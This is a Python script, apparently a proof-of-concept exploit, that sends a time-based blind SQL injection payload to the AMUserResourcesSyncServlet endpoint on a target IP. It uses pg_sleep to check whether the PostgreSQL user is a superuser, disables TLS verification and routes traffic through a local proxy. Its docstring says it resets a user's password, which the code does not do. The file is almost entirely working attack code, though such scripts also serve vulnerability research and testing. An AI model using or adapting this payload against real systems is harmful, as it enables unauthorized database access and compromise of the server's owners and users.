#!/bin/env/python3
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def test_inject(ip):
    """
    This will reset the password for the target user
    """
    print('(+) Attempting to inject url')

    #Target URL is: https://%s//servlet/AMUserResourcesSyncServlet?ForMasRange=&userId=?
    url = "https://{}:8443/servlet/AMUserResourcesSyncServlet".format(ip)
    print('url: {}'.format(url))
    #payload = '1;select+pg_sleep(100);'
    sqli = ';select+case+when(select+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(5)+end;--+'
    params = 'ForMasRange={}&userId={}{}'.format('1', '1', sqli)
    proxies = {'https':'http://127.0.0.1:8080'}
    r = requests.get(url, params=params, proxies=proxies, verify=False)
    print(r.text)
    print(r.headers)

def main():
    """
    This is the main function
    """
    if len(sys.argv) != 2:
        print('(+) usage: {} <target_ip> '.format(sys.argv[0]))
        print('(+) e.g.: {}192.168.137.113 '.format(sys.argv[0]))
        sys.exit(-1)

    ip = sys.argv[1]
    test_inject(ip)

if __name__ == "__main__":
    main()
